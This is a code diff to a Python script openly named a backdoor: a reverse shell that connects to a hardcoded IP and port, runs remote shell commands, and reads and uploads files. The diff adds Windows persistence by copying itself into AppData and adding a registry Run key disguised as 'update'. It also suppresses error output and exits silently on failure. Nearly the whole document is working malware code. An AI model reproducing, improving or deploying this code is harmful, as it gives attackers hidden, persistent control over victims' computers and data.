@@ -5,12 +5,21 @@ import subprocess
 import json
 import os
 import base64
+import sys
+import shutil
 
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistant()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
+
+    def become_persistant(self):
+        location = os.environ["appdata"] + "\\Data.exe"
+        if not os.path.exists(location):
+            shutil.copyfile(sys.executable, location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"', shell = True)
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -31,7 +40,8 @@ class Backdoor:
         return "[+] Changing working directory to " + path
 
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        DEVNULL = open(os.devnull, 'wb')
+        return subprocess.check_output(command, shell=True, stderr = DEVNULL, stdin= DEVNULL)
 
     def read_file(self, path):
         with open(path, "rb") as r_file:
@@ -39,7 +49,7 @@ class Backdoor:
 
     def write_file(self, path, content):
         with open(path, "wb") as w_file:
-            file.write(base64.b64decode(content))
+            w_file.write(base64.b64decode(content))
             return "[+] Upload Successful"
 
     def run(self):
@@ -51,7 +61,7 @@ class Backdoor:
             try:
                 if command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
 
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_work_dir(command[1])
@@ -70,9 +80,13 @@ class Backdoor:
 
             self.reliable_send(command_result)
 
+try:
+    my_backdoor = Backdoor("192.168.43.16", 4444)
+    my_backdoor.run()
 
-my_backdoor = Backdoor("192.168.43.16", 4444)
-my_backdoor.run()
+except Exception:
+    sys.exit()
+
 
 
 
